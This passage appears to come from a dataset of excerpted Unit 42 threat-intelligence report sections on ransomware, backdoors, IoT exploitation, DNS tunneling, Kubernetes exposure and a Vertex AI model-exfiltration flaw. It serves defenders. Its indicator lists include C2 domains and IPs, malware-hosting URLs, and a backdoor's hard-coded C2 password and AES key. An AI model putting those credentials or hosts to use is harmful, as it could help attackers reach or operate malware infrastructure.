out the network in order to move laterally and discover more potential victim hosts. Once the attacker has sufficiently found enough victim systems, SamSa is deployed manually, using common system administrator utilities, such as PSExec.\nAfter deploying the malware on various victim hosts, it will be installed using a RSA public key that is generated specifically for that particular attack. Additionally, a batch script is deployed that is responsible for deleting volume shadow copies on the victim machine to prevent restoration of files, executing SamSa, and finally self-destructing after successful encryption.", "source": "Palo"}, {"title": "Conclusion", "content": "Overall, SamSa has been a serious threat that has stayed under the radar until recently. The malware has been seen since December 2015, and is likely responsible for a number of large ransomware infections across organizations. While the malware itself is not terribly sophisticated, the tactics used by the attackers, such as the lack of command and control infrastructure, the ability to compromise external facing systems to gain unauthorized access, and movement towards more obfuscation, make SamSa a serious threat.\nIOCs for SamSa collected by Palo Alto Networks can be foundhere.\nPalo Alto Networks' customers are protected from this threat in the following ways:\nWildFire accurately identifies all SamSa malware samples as malicious. \nDomains used by SamSa have been flagged as malicious in Threat Prevention. \nAutoFocus users can view malware related to this attack using theSamSa", "source": "Palo"}, {"title": "Introduction", "content": "This article reviews the recently discovered FalseFont backdoor, which was used by a suspected Iranian-affiliated threat actor that Unit 42 tracks as Curious Serpens. Curious Serpens (aka Peach Sandstorm) is a known espionage group that has previously targeted the aerospace and energy sectors. FalseFont is the latest tool in Curious Serpens' arsenal. The examples we analyzed show how the threat actors mimic legitimate human resources software, using a fake job recruitment process to trick victims into installing the backdoor.\nOur in-depth technical analysis will help security professionals better understand FalseFont and more effectively defend against this threat. This article focuses on analysis of the newly discovered FalseFont backdoor and its capabilities. Lastly, we'll discuss ways to detect and prevent this targeted backdoor.\nPalo Alto Networks customers are better protected from the threats mentioned in this article in the following ways:\nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the malware C2 traffic \nAdvanced URL FilteringandDNS Securitycategorize known C2 domains and IPs as malicious. \nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others \nCortex XDRandPrisma Cloud Computecombined with theXSIAMplatform help detect and prevent the threats mentioned in this article \nTheAdvanced WildFiremachine learning-models and analysis techniques have been reviewed and updated in light of this new malware.", "source": "Palo"}, {"title": "Background", "content": "The threat actor we track as Curious Serpens is also known by other names, such asPeach Sandstorm,APT33,Elfin,HOLMIUM,MAGNALIUMorREFINED KITTEN. According to these reports, Curious Serpens has been active since at least 2013. This threat actor is associated with espionage and hastargetedorganizations in the Middle East, the United States and Europe.\nIn December 2023, Microsoft Threat Intelligence noted thatthis threat actor began using a new backdoorand identified the backdoor as FalseFont. By the end of January 2024, we saw the first publicanalysis of FalseFont. Here, we add to the analysis of FalseFont by sharing our observations, as well as additional information on the traffic and processes that we have detected and prevented.\nThe FalseFont backdoor is written in ASP .NET Core. Its capabilities include the following:\nExecuting processes and commands on the infected machine \nManipulating the file system \nCapturing the screen \nStealing credentials from browsers \nStealing credentials for an aerospace-industry job application platform, which could contain sensitive aerospace data\nFalseFont was observed in the wild, packed in a single native executable that is 182 MB in size. In addition to the malware itself, this executable contains various .NET components and libraries essential for the malware to operate. FalseFont also usesASP.NET Core SignalR, which is an open-source library for running web applications, for communication with its command and control server (C2).\nTargeting Aerospace and Defense Job Applicants\nThe FalseFont backdoor is a highly targeted backdoor, and so far it has been reported to target job applicants in the aerospace and defense industries. FalseFont targets these applicants by impersonating a graphical user interface (GUI) for submitting a job application to a U.S.-based aerospace company. Figure 1 shows the main window of the application.\nThreat actors often imitate legitimate products for malicious purposes. This does not imply a flaw or malicious quality to the legitimate product being abused.\nWhile the GUI is active for user interaction, in the background, the second and main component of the malware is running. As it runs, it is establishing persistence and registering itself to its C2 server.\nFalseFont's execution is detected and prevented by Cortex XDR, as shown in Figures 2 and 3.", "source": "Palo"}, {"title": "Conclusion", "content": "This article provides a technical analysis of FalseFont, a new backdoor developed by the suspected Iranian-affiliated threat actor known as Curious Serpens. We reviewed how FalseFont's operators target the aerospace and defense industries by attempting to mimic legitimate human resources software specific to these industries. This disguised executable ultimately causes the installation of the backdoor under the guise of a job recruitment process.\nWe then dived into FalseFont's core architecture, functionality and its elaborate interface to receive commands from the threat actors in real time. We also analyzed the framework that the threat actors chose for C2 communication, which included the implementation of a dual communication mechanism.\nLastly, we also showed how the Cortex XDR platform can detect and prevent the malware's different infection components.\nWe urge security professionals and defenders to carefully examine this report and leverage the information presented to improve existing practices in detection, prevention and hunting, ultimately fortifying their overall security stance.", "source": "Palo"}, {"title": "Indicators", "content": "FalseFont packed executable SHA256 hash:\n364275326bbfc4a3b89233dabdaf3230a3d149ab774678342a40644ad9f8d614\nFalseFont unpacked executable SHA256 hash:\n4145e792c9e9f3c4e80ca0e290bd7568ebcef678affd68d9b505f02c6acaab12\nMutex:\n864H!NKLNB*x_H?5\nPersistence paths:\n%username%\\AppData\\Roaming\\host.exe \n%username%\\AppData\\Local\\broker.exe \n%username%\\AppData\\Local\\Microsoft\\System.exe\nC2 Domain:\nDigitalcodecrafters[.]com\nC2 IP:\n64.52.80[.]30\nC2 username:\nMX2\nC2 password:\nNooVtlXgx2T3IyN4I0Xf\nBase 64-encoded hard-coded AES IV:\nviOIZ9cX59qDDjMHYsz1Yw==\nBase 64-encoded hard-coded AES key:\n3EzuNZ0RN3h3oV7rzILktSHSaHk+5rtcWOr0mlA1CUA=\nC2 URI Scheme:\nLogin/ \nLoginAsGuest/ \nrealtime/ \napi//Token/AgentRequestTime/Agent/Core/Command/Add/Result/Core/Command/Add/Schedule/Core/Command/Init/Core/Command/Last/Core/Command/Restart/FileStorage/FileStorage/Agent/Init/Upload/FileStorage/Agent/Upload/FileStorage/Agent/Download/LiveDirectory/Send/Dir/LiveDirectory/Send/Hard/LiveDirectory/Send/Screen \n/Token \n/AgentRequestTime/Agent \n/Core/Command/Add/Result \n/Core/Command/Add/Schedule \n/Core/Command/Init \n/Core/Command/Last \n/Core/Command/Restart \n/FileStorage \n/FileStorage/Agent/Init/Upload \n/FileStorage/Agent/Upload \n/FileStorage/Agent/Download \n/LiveDirectory/Send/Dir \n/LiveDirectory/Send/Hard \n/LiveDirectory/Send/Screen", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers review tens of millions of attack records every month, and most months, attacks targeting a single vulnerability do not exceed 10% of the total number of attacks. However,we discovered that between August and October 2022, the number of attacks attempting to exploit a Realtek Jungle SDK remote code execution vulnerability (CVE-2021-35394) accounted for more than 40% of the total number of attacks.\nAs of December 2022, we've observed 134 million exploit attempts in total leveraging this vulnerability, and about 97% of these attacks occurred after the start of August 2022. At the time of writing, the attack is still ongoing.\nMany of the attacks we observed tried to deliver malware to infect vulnerable IoT devices. This tells us that threat groups are using this vulnerability to carry out large-scale attacks on smart devices around the world. While the attacks we observed were successfully blocked by our products, it's important to assess protection of these devices in your environment. Because IoT devices and routers are often not considered as part of an organization's security posture, many devices and organizations could still be at risk.\nCVE-2021-35394 affects almost 190 models of devices from 66 different manufacturers. We believe that this vulnerability attracted so many attackers because supply chain issues can make it difficult for the average user to identify the affected products that are being exploited.\nIn response to this concerning phenomenon, we dug deep into all the attack records of this vulnerability from when it was disclosed to December 2022 for analysis.\nPalo Alto Networks customers receive protections from the vulnerability and malware families mentioned in this post with theNext-Generation Firewallwithcloud-delivered security servicesincludingWildFire.Advanced URL FilteringandDNS Securitycan block the command and control (C2) domain and malware hosting URLs. OurIoT Securityplatform can help identify anomalous network traffic, as well as determining the vendor, model and firmware version of a device to identify specific devices that are vulnerable to the aforementioned CVE.", "source": "Palo"}, {"title": "Conclusion", "content": "The surge of attacks leveraging CVE-2021-35394 shows that threat actors are very interested in supply chain vulnerabilities, which can be difficult for the average user to identify and remediate. These issues can make it difficult for the affected user to identify the specific downstream products that are being exploited.\nHaving robust security protections in place can help you block the malicious traffic we've described. If you confirm that a device has been affected by the malware referenced in this post, it is necessary to apply a factory reset on the device and reinstall the latest version of its software.\nAt home, if you have IoT or network devices from the aforementioned vendor list and have not recently looked for software updates or patches, now is a good time to do so. If you are able to determine that these devices are running slow or sending out a large amount of traffic to contact unknown domains, this could be a sign that your device has been affected by attackers.\nWe strongly recommend regularly applying patches and upgrades on smart devices as well as traditional desktops and mobile devices whenever possible, to ensure the best protections.\nPalo Alto Networks customers receive protections from the vulnerability and malware referenced in this post through the following products and services:\nNext-Generation Firewalls with a Threat Prevention security subscription can block the attacks with Best Practices via Threat Prevention signatures91535. \nWildFirecan stop the malware referenced in this article with static signature detections. \nAdvanced URL FilteringandDNS Securityare able to block the C2 domain and malware hosting URLs. \nThe Palo Alto Networks IoT security platform can leverage network traffic information to identify the vendor, model and firmware version of a device and identify specific devices that are vulnerable to the aforementioned CVE. \nIn addition,IoT Securityhas an inbuilt machine learning-based anomaly detection that can alert the customer if a device exhibits non-typical behavior, such as a sudden appearance of traffic from a new source, an unusually high number of connections or an inexplicable surge of certain attributes typically appearing in IoT application payloads.", "source": "Palo"}, {"title": "Indicators", "content": "Infrastructure\n199[.]195[.]251[.]190 \n172[.]81[.]41[.]196 \n103[.]149[.]137[.]124 \n103[.]149[.]137[.]138 \n46[.]249[.]32[.]181 \n69[.]67[.]150[.]36 \n103[.]149[.]137[.]192 \n45[.]125[.]236[.]14 \n173[.]247[.]227[.]66 \n173[.]247[.]227[.]70 \n185[.]122[.]204[.]30 \n45[.]95[.]55[.]188 \n2[.]58[.]113[.]79 \n45[.]95[.]55[.]24 \n45[.]95[.]55[.]218 \n45[.]95[.]55[.]189 \n193[.]142[.]146[.]35 \n37[.]139[.]129[.]11 \n78[.]135[.]85[.]70 \n45[.]137[.]21[.]166 \n195[.]178[.]120[.]183 \n195[.]133[.]81[.]29 \n5[.]253[.]246[.]67 \n45[.]61[.]184[.]133 \n45[.]61[.]184[.]118 \n149[.]5[.]173[.]33 \n163[.]123[.]143[.]226 \n45[.]61[.]188[.]148 \n103[.]207[.]38[.]165 \n45[.]13[.]227[.]115 \n176[.]97[.]210[.]147 \n163[.]123[.]143[.]200 \n185[.]44[.]81[.]62 \n38[.]22[.]109[.]7 \n147[.]182[.]132[.]144 \n205[.]185[.]126[.]88 \n209[.]141[.]51[.]43 \n198[.]98[.]52[.]213 \n45[.]95[.]55[.]185 \n20[.]249[.]89[.]181 \n3[.]235[.]28[.]168\nhxxp://185.205.12[.]157/trc/TRC[.]mpslhxxp://172.81.41[.]196/trc/TRC[.]mpslhxxp://135.148.104[.]21/mipselhxxp://199.195.251[.]190/trc/TRC[.]mpslhxxp://37.44.238[.]178/d/xd[.]mpslhxxp://176.97.210[.]135/assailant[.]mpslhxxp://198.98.56[.]129/trc/TRC[.]mpslhxxp://141.98.6[.]249/billy[.]shhxxp://185.216.71[.]157/Bins_Bot_hicore_mipsle\nArtifacts\n26e96945ee32199536d4c85124a24c28e853b557eb31f3907d19f08b9798dff41967370203138b9324f11c5cb3fd15ac8d2f0c585373486614600b676a4e264178953c71318fb93fa90607039bceb48f2746a8abfa3a9a8914c8fdc48ebf55df57d39a6a88093c9e1fbc1626105d714be92680bdf666279b7663bcaaf7fa7e6e78b55d3f1b34f1154a28ce4fc855252bc3104a07944053facf6acce9195b2e7781e581ed06515af959c8477442243f20baa77c0e54a1054542900936c6e81ff5ab3de77616b4d85f032a226da6c3629de4a8f1c1b4d32674c1bed30afb9419e1a877b4e71c8f2f4ab6915cbe8c57c82ac12331e183f7cbda2de4dc3780a5037926e96945ee32199536d4c85124a24c28e853b557eb31f3907d19f08b9798dff45e647d4991f9d339e6e83cee6168915e1e2c9fac0cddc53d3083cbc96a2780356bca8cf5e48e819179f8473e4e600da2c1ef00802bf1744885dcb5ad56618943\nbc03af5c06a7ff6774688e8d71f6d06e0d402f4f86d5b23969bc53d5eab3e52267f73e1efa3c3a05e896567dfb2cef56e9b5eb33283a13e5934900030357e7e6ebfedbcf428215d34d8f876fb9c5658048dbb4c5607f328ae155bf26a292b38de0fd14114737e4a599f0769683de4faf54cefae1cc106d9f475aa23bdbf5a7535967a4889b54b97adbb6b949ffd590fa416599326eb3432f40fa142aab1df795ff8a1abcd4fa94ffc0f1f43a92f816e6bd08272ec54d748cf004c3ef1323d5d9080a64d595ff246d01b920d5010cffcb4ac56f224acdec32ee3eab08099c6a7be1d3adcb85298a08973b7ae6702cc4830d20ebde98e2eac85179c1bbba3ef7acedec8e8d4c2ec0c489e4c5dbb89994c223f29e8d4470825bd488bf1a44e4275128d6dce95ffb8186ac8c611dee0681cca028bbf93365e4f0c7c67c235d3034a397878c28d915e2b56e7c06436d209a9198eb0c50bdfb1fd4602e9e95b5eb4321637dc2a8baf2a46ffe872aedc823ab766b4a9fbab129b2c7dc9513ba8ee712bc0d2c3120464184610ac939c34e5309968bd7b81255708307d545d742f3468930f3a3e90ea713215a4d30f0f142d6ef0f1ed72b246ee297b8bba64921dbf4300c3f8b5887ae0ef8b51845bf0f2996c4f9891cdc0724b7d0ccc3dbc1b4cdae11a21a70ceb57768d3e027e307abd09548f151a8d6da72532f1b88e9813eaf0bdad22ef3040947c9d51317e103457a6613ac9297cb610b3691ef6d440f15cb36a9ed9b7eb2cf51d806076e1662ca4ad800c1de421234c19fbea44b56eb47cc616fd8", "source": "Palo"}, {"title": "Introduction", "content": "DNS uses Port 53 which is nearly always open on systems, firewalls, and clients to transmit DNS queries. Rather than the more familiar Transmission Control Protocol (TCP) these queries use User Datagram Protocol (UDP) because of its low-latency, bandwidth and resource usage compared TCP-equivalent queries. UDP has no error or flow-control capabilities, nor does it have any integrity checking to ensure the data arrived intact.\nHow is internet use (browsing, apps, chat etc) so reliable then? If the UDP DNS query fails (it's a best-effort protocol after all) in the first instance, most systems will retry a number of times and only after multiple failures, potentially switch to TCP before trying again; TCP is also used if the DNS query exceeds the limitations of the UDP datagram size \u2013 typically 512 bytes for DNS but can depend on system settings.\nFigure 1 below illustrates the basic process of how DNS operates: the client sends a query string (for example, mail.google[.]com in this case) with a certain type \u2013 typically A for a host address. I've skipped the part whereby intermediate DNS systems may have to establish where '.com' exists, before finding out where 'google[.]com' can be found, and so on.\nFigure 1. Simplified DNS operation\nOnce a name is resolved to an IP caching also helps: the resolved name-to-IP is typically cached on the local system (and possibly on intermediate DNS servers) for a period of time. Subsequent queries for the same name from the same client then don't leave the local system until said cache expires. Of course, once the IP address of the remote service is known, applications can use that information to enable other TCP-based protocols, such as HTTP, to do their actual work, for example ensuring internet cat GIFs can be reliably shared with your colleagues.\nSo, all in all, a few dozen extra UDP DNS queries from an organization's network would be fairly inconspicuous and could allow for a malicious payload to beacon out to an adversary; commands could also be received to the requesting application for processing with little difficulty.\nIf you want to go deep on how DNS works \u2013 all the way from you typing keys to spell the domain name you want to browse \u2013 then pleaseread this article.", "source": "Palo"}, {"title": "Conclusion", "content": "DNS is a very powerful tool used almost everywhere allowing applications and systems to lookup resources and services with which to interact. DNS provides a communication foundation enabling higher-level and more powerful protocols to function but can mean it's overlooked from a security point of view, especially when you consider how much malware is delivered via email protocols or downloaded from the web using HTTP.\nFor these reasons, DNS is the perfect choice for adversaries who seek an always-open, often overlooked and probably underestimated protocol to leverage for communications from and to compromised hosts. Unit 42 has seen multiple instances of malware, and the actors behind them, abusing DNS to succeed in their objectives, as discussed in this report.\nOrganizations can defend themselves against DNS tunneling in many different ways, whether using Palo Alto Networks' Security Operating Platform, or Open Source technology. Defense can take many different forms such as, but not limited to, the following:\nBlocking domain-names (or IPs or geolocation regions) based on known reputation or perceived danger; \nRules around \"strange looking\" DNS query strings; \nRules around the length, type, or size of both outbound or inbound DNS queries; \nGeneral hardening of the client operating systems and understanding the name resolution capabilities as well as their specific search order; \nUser and/or system behavior analytics that automatically spot anomalies, such as new domains being accessed especially when the method of access and frequency are abnormal. \nPalo Alto Networks recently introduced a newDNS security servicefocused on blocking access to malicious domain names.\nFurther information can also be found in the ATT&CK framework documentation on Mitre's website. Specifically, the following techniques relate to concepts discussed in this report.\nThanks to Yanhui Jia, Rongbo Shao, Yi Ren, Matt Tennis, Xin Ouyang, John Harrison and Jens Egger for their input on this report.", "source": "Palo"}, {"title": "Introduction", "content": "To better detect attacks that affect the actions of signed applications \u2013 such as supply-chain attacks,dynamic-link libraries (DLL) hijacking, exploitation and malicious thread injection \u2013 we have devised a suite of analytics detectors that are able to detect global statistical anomalies.\nUsing these new detectors, we found what seems to be an industrial espionage attack. The observed activity includes performing a specially crafted DLL hijacking attack used by a previously unknown piece of malware that we dubbed \"Popping Eagle\" due to several artifacts found in the samples. It also includes a second stage malicious tool written inGodubbed \"Going Eagle.\" In this particular case, we observed the attacker following this by performing several network scans and lateral movement steps.\nDiscovering Popping Eagle using this new suite of analytics detectors underscores the following key points:\nThese analytical and statistical methods have capabilities that allow for the identification of malware that might otherwise have been missed. \nThough the malware loaded itself into a signed process with the goal of remaining undetected, these detectors found it due to the attempted obfuscation.\nIn this blog post, we discuss the hunting method, analyze the tools used in the attack and detail the actions performed by the attacker in the victim's environment.\nPalo Alto Networks customers are protected from this kind of attack by Cortex XDR, as well as the WildFire cloud-delivered security subscription for the Next-Generation Firewall. (Please see theConclusionsection for more detail.)", "source": "Palo"}, {"title": "Conclusion", "content": "As seen in the case above, attackers are using open-source code to develop custom malware that's designed to evade security detection. In order to combat more advanced actors, we must leverage more sophisticated detection techniques. Hunting for anomalous actions done by signed applications has proven itself successful in finding previously unknown attacks and \"dormant\" backdoors.\nDue to the malware's apparently being tailor-made for the attacked network and the use of common attack tools, we couldn't attribute it to a specific actor.\nPalo Alto Networks customers are protected from this kind of attack by the following:\n1.Cortex XDR's Global Analytics BIOC alerts, implementing, among many things, the statistical techniques described earlier.\n2. Cortex XDR Agent Behavioral Threat Protection blocks the DLL hijacking attack on the vulnerable application, preventing future malware from using the same loading method.\n3.WildFire, a cloud-delivered security subscription for the Next-Generation Firewall, and Cortex XDR identify and block all IoCs mentioned as well as all future IoCs identified by the Yara rules", "source": "Palo"}, {"title": "Introduction", "content": "In the race to gain a competitive edge, organizations are increasingly training artificial intelligence (AI) models on sensitive data. But what if a seemingly harmless AI model became a gateway for attackers?\nA malicious actor could upload a poisoned model to a public repository, and without realizing it, your team could deploy it in your environment. Once active, that model could exfiltrate your sensitive machine learning (ML) models and fine-tuned large language model (LLM) adapters. With access to these adapters, attackers could replicate your custom tuning and optimizations, exposing sensitive information embedded in fine-tuning patterns.\nPalo Alto Networks researchers recently uncovered two vulnerabilities in Google's Vertex AI platform. These vulnerabilities could have allowed attackers to escalate privileges and exfiltrate models.\nWe have shared these findings with our partners at Google, and they have since implemented fixes to eliminate these specific issues for Vertex AI on the Google Cloud Platform (GCP). Read on to understand how these vulnerabilities worked and how you can protect your environment from similar threats.\nIn this article, we outline our steps to discover two vulnerabilities in the Vertex AI platform:\nPrivilege escalation via custom jobsBy exploiting custom job permissions, we were able to escalate our privileges and gain unauthorized access to all data services in the project. \nModel exfiltration via malicious modelDeploying a poisoned model in Vertex AI led to the exfiltration of all other fine-tuned models, posing a serious proprietary and sensitive data exfiltration attack risk.\nOur examination of the first vulnerability ended with a classic privilege escalation, but the second vulnerability represents a much more interesting \"model-to-model\" infection scenario that required an in-depth exploration.\nFigure 1 shows a diagram demonstrating the two vulnerabilities.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourPrisma Cloudofferings.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "Vertex AI is a comprehensive platform for developing, training and deploying ML and AI models. A key feature of this platform is Vertex AI Pipelines, which allow users to tune their models usingcustom jobs, also referred to as custom training jobs.\nThese custom jobs are essentially code that runs within the pipeline and can modify models in various ways. While this flexibility is valuable, it also opens the door to potential exploitation.\nOur research focused on how attackers could abuse custom jobs. By manipulating the custom job pipeline, we discovered a privilege escalation path that allowed us to access resources far beyond the intended scope.\nIn Figure 2, tuning a Vertex AI model (ML or LLM) happens in a remote tenant project that is dedicated to the source project (step 1). The tuning process uses custom jobs defined in Vertex AI Pipelines, which are run on a different tenant project (step 2).\nWhen the tuning process is complete, a new tuned model is created in the model registry in the origin project (step 3). At this point, we deploy our model in a third different tenant project (step 4).", "source": "Palo"}, {"title": "Conclusion", "content": "This research highlights how a single malicious model deployment could compromise an entire AI environment. An attacker could use even one unverified model deployed on a production system to exfiltrate sensitive data, leading to severe model exfiltration attacks.\nThe permissions required to deploy a model might seem harmless, but in reality, that single permission could grant access to all other models in a vulnerable project. Only a very few individuals should have the permission to deploy new models in a project containing sensitive or production models without strict oversight.\nTo protect against such risks, we must implement strict controls on model deployments. A fundamental security practice is to ensure an organization's development or test environments are separate from its live production environment. This separation reduces the risk of an attacker accessing potentially insecure models before they are fully vetted. Whether it comes from an internal team or a third-party repository, validating every model before deployment is vital.\nThis highlights the critical need forPrisma Cloud AI Security Posture Management(AI-SPM) to help ensure robust oversight of AI pipelines.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Recently, we discovered a new version of theOceanLotusbackdoor in our WildFire cloud analysis platform which may be one of the more advanced backdoors we have seen on macOS to date. This iteration is targeted towards victims in Vietnam and still maintains extremely low AV detection almost a year after it was first discovered. Despite having been in the wild for an extended period of time, the operation appears to still be active. During our analysis, we were able communicate directly with the command and control server as recently as early June 2017.\nWhile there seem to be similarities to an OceanLotus sample discovered in May 2015, a variety of improvements have been made since then. Some of the improvements include the use of a decoy document, elimination of the use of command line utilities, a robust string encoding mechanism, custom binary protocol traffic with encryption, and a modularized backdoor.", "source": "Palo"}, {"title": "Conclusion", "content": "Most macOS malware in the wild today are not very complex, but threat actors have been quickly improving their tradecraft. The increased level of sophistication and complexity may be indicative of increased targeting of macOS hosts looking to the future. With this OceanLotus attack in combination with recent macOS versions of theSofacygroup'stoolset, we have now observed multiple espionage motivated threat actors targeting macOS. It is imperative that the same types of strong security practices and policies organizations use to defend Windows devices are applied universally to include macOS devices as well.\nApple has already updated the macOS protection systems to address this variant of OceanLotus.\nPalo Alto Networks customers are protected and may learn more via the following:\nSamples are classified as malicious by WildFire \nDomains and IPs have been classified as malicious and IPS signatures generated \nAutoFocus users may learn more via theOceanLotustag", "source": "Palo"}, {"title": "Indicators", "content": "b33370167853330704945684c50ce0af6eb27838e1e3f88ea457d2c88a223d8b  Noi dung chi tiet.zip\nb3cf3e3b52b4b899cd0814fc75698ea24f08ce18642665adcd3555a068b5c16d  Info.plist\n07154b7a45937f2f5a2cda5b701504b179d0304fc653edb2d0672f54796c35f7  Noi dung chi tiet\n82502191c9484b04d685374f9879a0066069c49b8acae7a04b01d38d07e8eca0  PkgInfo\nf0c1b360c0b24b5450a79138650e6ee254afae6ce8f6c68da7d1f32f91582680  .CFUserEncoding\ne84b5c5152d8edf1e814cc4b4975bfe4dc0063ef90294cc96b383f523042f783  info.icns\ncall[.]raidstore[.]org\ntechnology[.]macosevents[.]com\npress[.]infomapress[.]com\n24h[.]centralstatus[.]net\n93.115.38.178", "source": "Palo"}, {"title": "Introduction", "content": "Between October 2020 and February 2021, Unit 42 researchers periodically scanned and analyzed unsecured Kubernetes (also known as k8s) clusters on the internet. Kubernetes clusters can and should be configured for greater security, but when left unsecured, these clusters can be accessed anonymously by anyone who knows their IPs, ports and APIs. Researchers identified 2,100 unsecured Kubernetes clusters that consist of 5,300 nodes, 31,340 CPUs and 75,270 pods. A wide range of applications were seen running in these unsecured clusters, operated by organizations in sectors including e-commerce, finance and healthcare. The abundant computational resources and large amount of sensitive data in the applications \u2013 such as API tokens, database credentials, source code and personally identifiable information (PII) \u2013 make these unsecured clusters attractive targets to adversaries. The biggest cluster that researchers encountered had more than 500 nodes and 2,000 active pods.\nUnit 42 discovered malware and malicious activities in some of these unsecured Kubernetes clusters. While most malicious code we observed runs in pods as containers, some is directly deployed on the host. Every containerized application runs in an isolated workspace (namespace) with different process IDs, networks and file systems from all other applications. If malware bypasses the isolation and accesses the underlying host's resources, it also poses a risk to the cloud environment that hosts the cluster. With this level of access, researchers demonstrated that more lateral or vertical movements are possible, including extracting credentials, compromising registries and accessing the host's data and network.\nUnsecured Kubernetes API servers and unsecured Docker daemons have a lot in common. When misconfigured, adversaries can exploit the exposed APIs that run there to control the entire container platform. Our previous research identified numerous malicious activities in unsecured Docker daemons (examples includeGraboid,CetusandPro-Ocean). Interestingly, though we performed similar research, we have not seen as many malicious activities in Kubernetes as in Docker.\nDespite the seemingly lower level of malicious activities in unsecured Kubernetes clusters, attackers operating there could gain access to more valuable targets. As a compromised Kubernetes cluster can have much more resources (CPU, Memory and Network) and application data, a capable attacker can easily host command and control (C2) servers, build a botnet or steal sensitive data. We believe there will be more adversaries targeting or leveraging unsecured Kubernetes soon.\nPalo Alto Networks customers runningPrisma CloudorCN-Seriesare protected from this threat. Prisma Cloud'sKubernetes BenchmarkandRuntime Defensecan alert on insecure configurations and detect malicious activities such as cryptojacking. CN-Series provides complete L7 visibility that can effectively detect and isolate containers with malicious traffic.", "source": "Palo"}, {"title": "Conclusion", "content": "Between October 2020 and February 2021, Unit 42 researchers identified a large volume of sensitive data leaked from unsecured Kubernetes clusters on the Internet. The leaked data includes API tokens, database credentials, source code and PII. While we haven't seen any large-scale or sophisticated attacks, we observed an increasing trend of opportunistic attacks in the past five months. With the rapid adoption of container technology and the abundant computational resources in these Kubernetes clusters, we believe more adversaries will soon turn their attention to this unexplored space. Regardless, simple best practices and continuous monitoring can effectively prevent and detect most of these opportunistic attacks. With the complex and dynamic nature of Kubernetes technology, it is also recommended to oversee the clusters with cloud workload protection solutions such as Prisma Cloud.\nPalo Alto Networks customers runningPrisma Cloudare protected from this threat by the Runtime Protection and Cryptominer Detection features and by Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives. Prisma Cloud Compute's vulnerability scanner can alert on application vulnerabilities inside containers and platform/OS vulnerabilities on the hosts.\nHighlights from the Unit 42 Cloud Threat Report, 1H 2021", "source": "Palo"}, {"title": "Introduction", "content": "Customers' rising online shopping habits throughout the holiday season are well known, and it seemed likely that cybercriminals would want to capitalize. As we continue to track and observe trends in web threats and how attackers take advantage of them, we were able to use our web threat detection module to quantify the spike in malicious URLs during the most recent holiday season.\nFrom October 2021 to December 2021, our web threat detection module, with the Palo Alto Networks proactive monitoring and detection service, found around 533,000 incidents of malicious landing URLs, 120,753 of which are unique landing URLs. It also detected around 2,900,000 malicious host URLs, 165,000 of which are unique malicious host URLs. We define a malicious landing URL as a URL that provides an opportunity for a user to click a malicious link. A malicious host URL is the page that actually contains a malicious snippet that could abuse a user's computing power, steal sensitive information or perform other types of attacks.\nThe following sections present our analysis of findings regarding these web threat trends, including when they are more active, where they are hosted, what categories they belong to and which malware families present threats more often. We highlight the numbers from October to December 2021 in order to raise awareness of threats active in the holiday season.\nPalo Alto Networks customers are protected from the web threats discussed here and many others via theAdvancedURL FilteringandThreat Preventioncloud-delivered security subscriptions.", "source": "Palo"}, {"title": "Conclusion", "content": "As we saw previously, the most prevalent web threats are still cryptominers, JS downloaders, web skimmers, web scams and JS redirectors. Attackers' top three targets among the landing URLs we analyzed were personal sites and blogs, business and economy sites and shopping sites.\nFurthermore, we found that web threat activity rose during the holiday season in conjunction with customers' rising shopping activities. This serves as a reminder to exercise caution while shopping for gifts for family and friends during the holiday season, particularly when visiting new websites.\nWhile cybercriminals continue to seek opportunities for malicious cyber activities, Palo Alto Networks customers receive protections from the web threat attacks discussed here and many others via the AdvancedURL FilteringandThreat Preventioncloud-delivered security subscriptions.\nWe also recommend the following actions:\nContinuously update yourNext-Generation Firewallswith the latest Palo Alto Networks Threat Prevention content. \nRun aBest Practice Assessmentto improve your security posture.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Introduction", "content": "Repellent Scorpius is a new ransomware-as-a-service (RaaS) group that distributes Cicada3301 ransomware. The ransomware group appears to have first emerged in May 2024, with a multi-extortion operation.\nThis report based on Unit 42 Incident Response engagements provides a technical analysis of the ransomware employed by the Repellent Scorpius group. It also covers other tactics, techniques and procedures (TTPs) observed during this attack.\nIn addition, we discuss Repellent Scorpius' connection to a historical incident involving data exfiltration, predating the group's operation under the Cicada3301 brand, as well as the ransomware group's plans going forward. Finally, we provide a walkthrough of an updated encryptor obtained through external sources, highlighting the differences from its previous variant. Unit 42 anticipates a rise in Cicada3301 ransomware activity, leading to an increase in the number of victims.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nCortex XDR \nAdvanced WildFire \nAdvanced URL FilteringandAdvanced DNS Security \nPrisma Cloud through theCloud Security Agent (CSA)\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Although it may not currently appear to be widespread, Repellent Scorpius is actively hiring IAB and network intruders. It has also recently set up a RaaS affiliate program. Therefore, we can expect to see attackers posting a growing list of active incidents and victims on their leak site in the near future.\nThe TTPs highlighted here are from specific incident response engagements. Considering that the Cicada3301 ransomware is relatively new, we expect that its TTPs will change and evolve over time.", "source": "Palo"}, {"title": "Introduction", "content": "Recently, we discovered a new Google Android Trojan named \"PluginPhantom\", which steals many types of user information including: files, location data, contacts and Wi-Fi information. It also takes pictures, captures screenshots, records audios, intercepts and sends SMS messages. In addition, it can log the keyboard input by the Android accessibility service, acting as a keylogger.\nPluginPhantom is a new class of Google Android Trojan: 